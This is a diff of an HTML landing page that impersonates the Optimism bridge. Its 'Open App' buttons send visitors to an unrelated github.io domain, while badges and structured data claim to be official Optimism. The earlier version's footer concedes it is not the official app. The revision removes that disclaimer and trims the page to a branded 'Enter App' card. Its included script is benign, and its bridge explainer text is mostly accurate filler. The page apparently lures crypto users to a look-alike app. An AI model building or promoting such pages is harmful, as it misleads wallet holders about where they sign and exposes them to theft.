@@ -1,47 +1,90 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Bridge Optimism - Open App</title><meta name="description" content="bridge optimism through the official OP Mainnet Gateway to move ETH or supported ERC-20 tokens between Ethereum and OP Mainnet.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://bridge-optimism.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Bridge Optimism - Open App"><meta property="og:description" content="bridge optimism through the official OP Mainnet Gateway to move ETH or supported ERC-20 tokens between Ethereum and OP Mainnet.">
-<meta property="og:url" content="https://bridge-optimism.github.io/"><meta property="og:image" content="https://bridge-optimism.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Bridge Optimism - Open App"><meta name="twitter:description" content="bridge optimism through the official OP Mainnet Gateway to move ETH or supported ERC-20 tokens between Ethereum and OP Mainnet."><meta name="twitter:image" content="https://bridge-optimism.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://bridge-optimism.github.io/#website","url":"https://bridge-optimism.github.io/","name":"OP Mainnet Gateway"},{"@type":"WebPage","@id":"https://bridge-optimism.github.io/#webpage","url":"https://bridge-optimism.github.io/","name":"Bridge Optimism - Open App","description":"bridge optimism through the official OP Mainnet Gateway to move ETH or supported ERC-20 tokens between Ethereum and OP Mainnet.","inLanguage":"en","isPartOf":{"@id":"https://bridge-optimism.github.io/#website"}},{"@type":"Organization","@id":"https://bridge-optimism.github.io/#org","name":"OP Mainnet Gateway","url":"https://bridge-optimism.github.io/","logo":"https://bridge-optimism.github.io/og-cover.png","sameAs":["https://x.com/Optimism","https://github.com/ethereum-optimism","https://www.coingecko.com/en/coins/optimism","https://defillama.com/chain/Optimism"]},{"@type":"WebApplication","@id":"https://bridge-optimism.github.io/#app","name":"Bridge Optimism","url":"https://bridge-optimism.github.io/","applicationCategory":"FinanceApplication","operatingSystem":"Web","browserRequirements":"Requires JavaScript","description":"bridge optimism through the official OP Mainnet Gateway to move ETH or supported ERC-20 tokens between Ethereum and OP Mainnet.","featureList":["Official Optimism bridge link","Standard Bridge support","OP Mainnet chain ID 10"],"isPartOf":{"@id":"https://bridge-optimism.github.io/#website"}},{"@type":"FAQPage","@id":"https://bridge-optimism.github.io/#faq","inLanguage":"en","mainEntity":[{"@type":"Question","name":"How long does it take to bridge from Ethereum to Optimism?","acceptedAnswer":{"@type":"Answer","text":"Depositing from Ethereum to OP Mainnet through the Standard Bridge is usually a short process once the Ethereum transaction confirms. The Optimism Standard Bridge documentation describes Ethereum-to-OP Mainnet transfers as typically completed in 1-3 minutes. Actual timing can vary with Ethereum congestion, wallet confirmation speed, and bridge indexing."}},{"@type":"Question","name":"Why does Optimism withdrawal take 7 days?","acceptedAnswer":{"@type":"Answer","text":"OP Mainnet withdrawals to Ethereum use an optimistic-rollup challenge period. The 7-day wait gives the system time to handle fraud-proof assumptions before assets are released on Ethereum; ethereum.org optimistic rollup docs explain why this challenge model exists. It is expected behavior for canonical withdrawals, not a fee setting that can be skipped inside the Standard Bridge."}},{"@type":"Question","name":"Can I bridge OP token to Optimism?","acceptedAnswer":{"@type":"Answer","text":"OP exists as the Optimism ecosystem token, but bridge availability depends on the source network and the token contract you hold. CoinMarketCap's OP market profile is a useful neutral reference for the token entity; if OP is on an exchange, a direct OP Mainnet withdrawal may be simpler than bridging from Ethereum."}},{"@type":"Question","name":"Does Optimism bridge support USDC?","acceptedAnswer":{"@type":"Answer","text":"USDC availability on OP Mainnet can include native and bridged representations, so users should pay attention to the exact token contract. DefiLlama's Optimism stablecoin dashboard gives a separate stablecoin-focused reference point; before transferring size, check the destination protocol's supported USDC contract and consider a small test transfer."}},{"@type":"Question","name":"What happens if I bridge the wrong token to Optimism?","acceptedAnswer":{"@type":"Answer","text":"If the token is unsupported or the wrong representation, it may arrive as an asset your intended app does not recognize. The funds may still be visible at the address, but using them can require another bridge, swap, or manual token import. Always verify the source token, destination token, and receiving address with the OP Mainnet explorer before confirming."}},{"@type":"Question","name":"Can smart contract wallets use the Optimism bridge?","acceptedAnswer":{"@type":"Answer","text":"Smart contract wallets need extra care with bridge functions because contracts may not exist at the same address on every chain. Optimism Standard Bridge contract guidance warns developers about recipient-specific bridge functions. Users should follow wallet-specific guidance before bridging from a contract account."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="OP Mainnet Gateway"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">OP Mainnet Gateway</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Bridge Optimism</h1>
-      <div class="bridge-widget" role="group" aria-label="OP Mainnet Gateway preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>ETH</b> · OP Mainnet</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-optimism.png" alt="OP Mainnet" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open OP Mainnet Gateway ↗</a></div>
-      <p class="hero-note">Live preview — open the official OP Mainnet Gateway app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official Optimism bridge link</span><span class="trust-chip">Standard Bridge support</span><span class="trust-chip">OP Mainnet chain ID 10</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Bridge Optimism?</h2><div class="capsule"><strong>OP Mainnet Gateway</strong> is the Optimism Foundation-linked bridge interface for moving assets between Ethereum and OP Mainnet. It routes users to the <a class="inline-link" href="https://app.optimism.io/bridge" rel="noopener noreferrer">official bridge interface</a>, while the broader bridge model is a way to move value or data between separate blockchain environments.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Bridge Optimism at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Ethereum Layer 2 bridge</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://chainlist.org/chain/10" rel="noopener noreferrer">OP Mainnet</a></b></div><div class="f"><small>Token</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/optimism" rel="noopener noreferrer">OP</a></b></div><div class="f"><small>Settlement</small><b>Ethereum</b></div><div class="f"><small>Withdrawal period</small><b>7 days on the Standard Bridge</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Optimism bridge fees and speed</h2><div class="intent-a">Optimism bridge costs depend on Ethereum gas, OP Mainnet gas, and token approval transactions. Deposits from Ethereum to OP Mainnet through the Standard Bridge are usually completed in minutes, while withdrawals back to Ethereum take longer because of the challenge-period design. Wallet timing depends on source-chain confirmation, bridge indexing, and the exit direction; <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-are-gas-fees" rel="noopener noreferrer">gas fee basics</a> explain why transaction costs can move before confirmation, and <a class="inline-link" href="https://l2fees.info/" rel="noopener noreferrer">Layer 2 fee trackers</a> can help frame current network-cost comparisons.</div></div></section><section class="section"><div class="container"><h2>Optimism withdrawal 7 days explained</h2><div class="intent-a">The 7-day Optimism withdrawal period applies when exiting OP Mainnet to Ethereum through the Standard Bridge. It exists because OP Mainnet is an optimistic rollup, and withdrawals must pass through a challenge window before funds can be finalized on Ethereum. The <a class="inline-link" href="https://ethereum.org/developers/docs/scaling/optimistic-rollups/" rel="noopener noreferrer">optimistic rollup model</a> is the reason this is expected behavior for canonical withdrawals, not a fee setting that can be skipped inside the Standard Bridge.</div></div></section><section class="section section-alt"><div class="container"><h2>Optimism supported bridge tokens</h2><div class="intent-a">The Optimism Standard Bridge supports ETH and standard ERC-20 tokens that follow the expected bridge interfaces. The <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 token interface</a> defines the common token methods wallets and contracts expect. Users should verify the token contract on both Ethereum and OP Mainnet, especially when a token has multiple bridged versions; if a wallet or DeFi app shows a similar ticker more than once, the contract address matters more than the symbol.</div></div></section><section class="section"><div class="container"><h2>Bridge ETH to Optimism for gas</h2><div class="intent-a">ETH is the gas asset used on OP Mainnet, so many users bridge ETH first before moving ERC-20 positions. Keeping a small ETH balance on OP Mainnet helps pay for swaps, approvals, NFT mints, and future transfers. If you bridge only a token such as USDC or WBTC, you may still need ETH to use it. Check the estimated received amount and network selector in the bridge UI, then verify your OP Mainnet address or transaction on the <a class="inline-link" href="https://optimistic.etherscan.io/" rel="noopener noreferrer">OP Mainnet block explorer</a> after the deposit confirms.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Bridge Optimism</h2><ol class="steps"><li><b>Open the gateway</b><span>Use the official app URL and connect a wallet you control.</span></li><li><b>Choose direction</b><span>Select Ethereum to OP Mainnet for deposits, or OP Mainnet to Ethereum for withdrawals.</span></li><li><b>Pick asset and amount</b><span>Review token, network, recipient, and <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 approval behavior</a> before signing.</span></li><li><b>Track settlement</b><span>Deposits are typically faster; withdrawals to Ethereum include the protocol challenge period.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official OP Mainnet Gateway app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open OP Mainnet Gateway ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Optimism Bridge vs fast liquidity bridges</h2><div class="intent-a">Canonical and liquidity bridges make different tradeoffs. DefiLlama tracks <a class="inline-link" href="https://defillama.com/bridges" rel="noopener noreferrer">bridge volume by chain</a>, while Binance Academy's bridge overview separates custodial and non-custodial designs in its <a class="inline-link" href="https://www.binance.com/en/academy/articles/what-s-a-blockchain-bridge" rel="noopener noreferrer">blockchain bridge taxonomy</a>.</div><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Optimism Standard Bridge</th><th>Liquidity bridge</th></tr></thead><tbody><tr><td>Main route</td><td>Ethereum &lt;&gt; OP Mainnet</td><td>Multiple chains</td></tr><tr><td>Withdrawal timing</td><td>7-day canonical exit to Ethereum</td><td>Often faster if liquidity exists</td></tr><tr><td>Token handling</td><td>Standard Bridge token representations</td><td>Pool or route-specific assets</td></tr><tr><td>Best for</td><td>Canonical deposits and exits</td><td>Speed-sensitive smaller transfers</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="facts"><div class="f"><small>Fees</small><b><a class="inline-link" href="https://l2fees.info/" rel="noopener noreferrer">Gas estimates can move</a></b><p>Wallet quotes can change with network demand; on-chain actions are irreversible and this is not financial advice.</p></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.binance.com/en/academy/articles/what-s-a-blockchain-bridge" rel="noopener noreferrer">Bridge trust models differ</a></b><p>Review who controls the route before signing; on-chain actions are irreversible and this is not financial advice.</p></div><div class="f"><small>Security</small><b><a class="inline-link" href="https://www.investopedia.com/what-are-cross-chain-bridges-6750848" rel="noopener noreferrer">Cross-chain bridge risks</a></b><p>Verify domains, tokens, and recipients carefully; on-chain actions are irreversible and this is not financial advice.</p></div></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Bridge Optimism FAQ</h2><div class="faq-list"><details open><summary><h3>How long does it take to bridge from Ethereum to Optimism?</h3></summary><div>Depositing from Ethereum to OP Mainnet through the Standard Bridge is usually a short process once the Ethereum transaction confirms. The <a class="inline-link" href="https://docs.optimism.io/app-developers/guides/bridging/standard-bridge" rel="noopener noreferrer">Optimism Standard Bridge documentation</a> describes Ethereum-to-OP Mainnet transfers as typically completed in 1-3 minutes. Actual timing can vary with Ethereum congestion, wallet confirmation speed, and bridge indexing.</div></details><details><summary><h3>Why does Optimism withdrawal take 7 days?</h3></summary><div>OP Mainnet withdrawals to Ethereum use an optimistic-rollup challenge period. The 7-day wait gives the system time to handle fraud-proof assumptions before assets are released on Ethereum; <a class="inline-link" href="https://ethereum.org/developers/docs/scaling/optimistic-rollups/" rel="noopener noreferrer">ethereum.org optimistic rollup docs</a> explain why this challenge model exists. It is expected behavior for canonical withdrawals, not a fee setting that can be skipped inside the Standard Bridge.</div></details><details><summary><h3>Can I bridge OP token to Optimism?</h3></summary><div>OP exists as the Optimism ecosystem token, but bridge availability depends on the source network and the token contract you hold. <a class="inline-link" href="https://coinmarketcap.com/currencies/optimism-ethereum/" rel="noopener noreferrer">CoinMarketCap's OP market profile</a> is a useful neutral reference for the token entity; if OP is on an exchange, a direct OP Mainnet withdrawal may be simpler than bridging from Ethereum. If it is in a wallet, use a verified bridge route and confirm the destination contract.</div></details><details><summary><h3>Does Optimism bridge support USDC?</h3></summary><div>USDC availability on OP Mainnet can include native and bridged representations, so users should pay attention to the exact token contract. DefiLlama's <a class="inline-link" href="https://defillama.com/stablecoins/Optimism" rel="noopener noreferrer">Optimism stablecoin dashboard</a> gives a separate stablecoin-focused reference point; a bridge may deliver a version that is accepted by some apps but not all. Before transferring size, check the destination protocol's supported USDC contract and consider a small test transfer.</div></details><details><summary><h3>What happens if I bridge the wrong token to Optimism?</h3></summary><div>If the token is unsupported or the wrong representation, it may arrive as an asset your intended app does not recognize. The funds may still be visible at the address, but using them can require another bridge, swap, or manual token import. Always verify the source token, destination token, and receiving address with the <a class="inline-link" href="https://optimistic.etherscan.io/" rel="noopener noreferrer">OP Mainnet explorer</a> before confirming.</div></details><details><summary><h3>Can smart contract wallets use the Optimism bridge?</h3></summary><div>Smart contract wallets need extra care with bridge functions because contracts may not exist at the same address on every chain. Optimism's <a class="inline-link" href="https://docs.optimism.io/app-developers/guides/bridging/standard-bridge" rel="noopener noreferrer">Standard Bridge contract guidance</a> warns developers about recipient-specific bridge functions. Users should follow wallet-specific guidance before bridging from a contract account.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Not the official app; verify app.optimism.io before connecting, and use this page for education only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Bridge Optimism</title>
+  <meta name="description" content="Bridge Optimism moves ETH and tokens between Ethereum and Optimism through a fast, low-fee route.">
+  <link rel="canonical" href="https://bridge-optimism.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F4F6FB">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Bridge Optimism">
+  <meta property="og:description" content="Bridge Optimism moves ETH and tokens between Ethereum and Optimism through a fast, low-fee route.">
+  <meta property="og:url" content="https://bridge-optimism.github.io/">
+  <meta property="og:image" content="https://bridge-optimism.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Bridge Optimism">
+  <meta name="twitter:description" content="Move ETH and tokens between Ethereum and Optimism in one clean, fast flow.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Bridge Optimism</a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://optimistic.etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">OP Explorer</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
+      <a href="https://l2beat.com/scaling/projects/optimism" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="sp"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <h1>Bridge Optimism</h1>
+    <p class="sub"><strong>Bridge Optimism</strong> moves ETH and tokens between Ethereum and Optimism through a fast, low-fee route.</p>
+
+    <section class="card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="lbl">From</span>
+          <span class="chip">
+            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
+            <span class="t">ETH</span>
+          </span>
+        </div>
+        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
+        <div class="leg">
+          <span class="lbl">To</span>
+          <span class="chip">
+            <img class="ic" src="op.png" width="26" height="26" alt="OP">
+            <span class="t">OP</span>
+          </span>
+        </div>
+      </div>
+      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <p class="note">Preview only &mdash; rates, routes and fees are shown in the app.</p>
+    </section>
+  </main>
+
+  <footer class="foot">
+    <b>Bridge Optimism</b> &mdash; 2026
+  </footer>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Bridge Optimism", "inLanguage": "en" },
+      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Optimism", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://www.optimism.io/","https://x.com/Optimism","https://github.com/ethereum-optimism","https://docs.optimism.io/"] },
+      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Bridge Optimism", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
+    ]
+  }
+  </script>
+
+  <script>
+  (function(){
+    "use strict";
+    var root=document, btn=root.querySelector('[data-dir]');
+    if(!btn) return;
+    btn.addEventListener('click', function(){
+      var chips=root.querySelectorAll('.leg .chip');
+      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
+    });
+  })();
+  </script>
+</body>
+</html>
